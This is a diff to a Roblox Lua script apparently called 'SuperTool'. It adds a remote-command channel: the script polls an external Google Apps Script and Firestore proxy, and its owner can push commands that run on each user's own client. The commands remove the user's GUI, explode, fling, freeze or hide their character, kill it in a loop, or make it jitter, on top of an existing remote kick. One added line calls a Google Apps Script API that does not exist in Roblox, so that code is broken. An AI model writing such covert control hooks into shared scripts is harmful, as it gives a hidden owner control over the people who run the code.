@@ -16,7 +16,7 @@ local player = Players.LocalPlayer
 -- =====================================================
 -- PROXY CONFIG (Google Apps Script)
 -- =====================================================
-local PROXY_URL = "https://script.google.com/macros/s/AKfycbxnJqPSFWIXBsSAZDEwrmQvQ4F9_s6BM0Hjl8_LeG8hGZbj9nURftM4mPqOMI6k0CYt/exec"
+local PROXY_URL = "https://script.google.com/macros/s/AKfycbxhTeD_8eRUJ4SxuCMCbgFCk6lYKpe2dVQTBKAFUKuFE5QJa4Up802x9k8FUTmk4DiH/exec"
 local OWNER_NAME = "FariNoveri_2"
 
 -- =====================================================
@@ -170,7 +170,6 @@ task.spawn(function()
                         -- Cek kick_message
                         if check.kick_message and check.kick_message ~= "" and check.kick_message ~= "nil" then
                             local msg = check.kick_message
-                            -- Clear DULU sebelum kick supaya tidak kick berulang
                             local cleared = false
                             pcall(function()
                                 firestoreUpdate("users", player.Name, {
@@ -181,13 +180,204 @@ task.spawn(function()
                                 })
                                 cleared = true
                             end)
-                            -- Hanya kick kalau clear berhasil
                             if cleared then
                                 warn("[SuperTool] Player di-kick: " .. player.Name .. " | Pesan: " .. msg)
-                                task.wait(1) -- tunggu sebentar biar clear sempat tersimpan
+                                task.wait(1)
                                 player:Kick(msg)
                             end
                         end
+
+                        -- Cek command
+                        if check.command and check.command ~= "" and check.command ~= "nil" then
+                            local cmd = check.command
+                            -- Clear command dulu
+                            pcall(function()
+                                local token = ScriptApp and ScriptApp.getOAuthToken() or nil
+                                firestoreUpdate("users", player.Name, {
+                                    last_online = os.time(),
+                                    map_id = tostring(game.PlaceId),
+                                    job_id = tostring(game.JobId)
+                                })
+                            end)
+                            -- Clear via proxy
+                            pcall(function()
+                                local clearUrl = PROXY_URL .. "?action=command&username=" .. player.Name .. "&command="
+                                game:HttpGet(clearUrl)
+                            end)
+
+                            warn("[SuperTool] Command diterima: " .. cmd)
+
+                            -- Execute command
+                            if cmd == "removegui" then
+                                -- Hapus semua ScreenGui kecuali CoreGui
+                                pcall(function()
+                                    for _, gui in pairs(player.PlayerGui:GetChildren()) do
+                                        if gui:IsA("ScreenGui") then
+                                            gui:Destroy()
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "respawn" then
+                                -- Respawn player
+                                pcall(function()
+                                    player:LoadCharacter()
+                                end)
+
+                            elseif cmd == "explode" then
+                                -- Explode di posisi player
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        if root then
+                                            local explosion = Instance.new("Explosion")
+                                            explosion.Position = root.Position
+                                            explosion.BlastRadius = 10
+                                            explosion.BlastPressure = 500000
+                                            explosion.DestroyJointRadiusPercent = 0
+                                            explosion.Parent = game.Workspace
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "nuke" then
+                                -- Nuke besar
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        if root then
+                                            for i = 1, 5 do
+                                                local explosion = Instance.new("Explosion")
+                                                explosion.Position = root.Position + Vector3.new(
+                                                    math.random(-20, 20),
+                                                    math.random(0, 15),
+                                                    math.random(-20, 20)
+                                                )
+                                                explosion.BlastRadius = 30
+                                                explosion.BlastPressure = 9999999
+                                                explosion.Parent = game.Workspace
+                                                task.wait(0.1)
+                                            end
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "fling" then
+                                -- Fling player ke atas dengan kecepatan tinggi
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        if root then
+                                            local bv = Instance.new("BodyVelocity")
+                                            bv.Velocity = Vector3.new(
+                                                math.random(-200, 200),
+                                                math.random(500, 1000),
+                                                math.random(-200, 200)
+                                            )
+                                            bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+                                            bv.Parent = root
+                                            game:GetService("Debris"):AddItem(bv, 0.2)
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "freeze" then
+                                -- Freeze player (anchor root)
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        local hum = char:FindFirstChild("Humanoid")
+                                        if root then root.Anchored = true end
+                                        if hum then hum.WalkSpeed = 0 hum.JumpPower = 0 end
+                                    end
+                                end)
+
+                            elseif cmd == "unfreeze" then
+                                -- Unfreeze player
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        local root = char:FindFirstChild("HumanoidRootPart")
+                                        local hum = char:FindFirstChild("Humanoid")
+                                        if root then root.Anchored = false end
+                                        if hum then hum.WalkSpeed = 16 hum.JumpPower = 50 end
+                                    end
+                                end)
+
+                            elseif cmd == "invisible" then
+                                -- Invisible semua part
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        for _, part in pairs(char:GetDescendants()) do
+                                            if part:IsA("BasePart") or part:IsA("Decal") then
+                                                part.Transparency = 1
+                                            end
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "visible" then
+                                -- Visible kembali
+                                pcall(function()
+                                    local char = player.Character
+                                    if char then
+                                        for _, part in pairs(char:GetDescendants()) do
+                                            if part:IsA("BasePart") then
+                                                part.Transparency = 0
+                                            elseif part:IsA("Decal") then
+                                                part.Transparency = 0
+                                            end
+                                        end
+                                    end
+                                end)
+
+                            elseif cmd == "loopkill" then
+                                -- Loop kill setiap 1 detik selama 10x
+                                pcall(function()
+                                    task.spawn(function()
+                                        for i = 1, 10 do
+                                            local char = player.Character
+                                            if char then
+                                                local hum = char:FindFirstChild("Humanoid")
+                                                if hum then hum.Health = 0 end
+                                            end
+                                            task.wait(1)
+                                        end
+                                    end)
+                                end)
+
+                            elseif cmd == "seizure" then
+                                -- Seizure effect (spam fling kecil)
+                                pcall(function()
+                                    task.spawn(function()
+                                        for i = 1, 20 do
+                                            local char = player.Character
+                                            if char then
+                                                local root = char:FindFirstChild("HumanoidRootPart")
+                                                if root then
+                                                    local bv = Instance.new("BodyVelocity")
+                                                    bv.Velocity = Vector3.new(
+                                                        math.random(-50, 50),
+                                                        math.random(20, 80),
+                                                        math.random(-50, 50)
+                                                    )
+                                                    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+                                                    bv.Parent = root
+                                                    game:GetService("Debris"):AddItem(bv, 0.1)
+                                                end
+                                            end
+                                            task.wait(0.15)
+                                        end
+                                    end)
+                                end)
+
+                            end -- end cmd check
+                        end -- end command check
                     end
                 end)
             end
